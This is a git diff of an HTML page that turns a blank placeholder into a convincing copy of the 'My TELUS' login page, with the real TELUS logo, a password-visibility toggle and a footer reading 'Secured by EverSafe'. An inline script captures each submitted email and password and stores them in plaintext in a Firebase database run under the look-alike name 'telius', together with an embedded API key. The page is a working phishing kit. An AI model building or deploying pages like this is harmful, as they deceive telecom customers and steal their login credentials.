@@ -1,12 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>My TELUS Login</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
+
 <body>
-    Welcome
-    <script src="./JS/validate-auth.js"></script>
+  <div class="container">
+    <img src="https://www.telus.com/etc.clientlibs/telus/clientlibs/clientlib-site/resources/images/global/logo.svg"
+      class="logo" alt="TELUS Logo" />
+    <h2>Log in to My TELUS</h2>
+    <form id="userForm">
+      <label>Email or username</label>
+      <input type="text" id="email" placeholder="Email" required>
+      <a href="#">Forgot your email/username?</a>
+
+      <label>Password</label>
+      <div class="password-box">
+        <input type="password" id="password" placeholder="Password" required>
+
+        <span class="eye" id="paw-toggle">👁️</span>
+      </div>
+      <a href="#">Forgot your password?</a>
+
+      <button type="submit">Log in</button>
+      <div class="or">or</div>
+      <button class="alt-btn" type="button">Send me a link to log in</button>
+    </form>
+    <p>New to My TELUS? <a href="#">Register now →</a></p>
+    <p><a href="#">Log in to your TELUS email →</a></p>
+    <footer>Secured by <strong>EverSafe™</strong></footer>
+  </div>
+
+  <script>
+    document.getElementById("paw-toggle").addEventListener("click", function () {
+      const passwordField = document.getElementById("password");
+      const eyeIcon = this;
+      if (passwordField.type === "password") {
+        passwordField.type = "text";
+        eyeIcon.textContent = "👁️"; // Change to closed eye icon
+      } else {
+        passwordField.type = "password";
+        eyeIcon.textContent = "👁️"; // Change to open eye icon
+      }
+    });
+  </script>
+  <!-- Firebase SDKs -->
+  <script type="module">
+    
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyD0Lxej2wx8OvYK4wryeY4pRVDa0mwXV_0",
+      authDomain: "telius.firebaseapp.com",
+      projectId: "telius",
+      storageBucket: "telius.firebasestorage.app",
+      messagingSenderId: "376095676569",
+      appId: "1:376095676569:web:52bf6e366e8b91887f4008",
+      databaseURL: "https://telius-default-rtdb.firebaseio.com"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Handle form submit
+    document.getElementById("userForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const userId = Date.now(); // use timestamp as unique ID
+
+      try {
+        await set(ref(db, "users/" + userId), {
+          email: email,
+          password: password
+        });
+        document.getElementById("message").innerText = "✅ User saved successfully!";
+        document.getElementById("userForm").reset();
+      } catch (error) {
+        console.log( error.message);
+      }
+    });
+  </script>
 </body>
+
 </html>
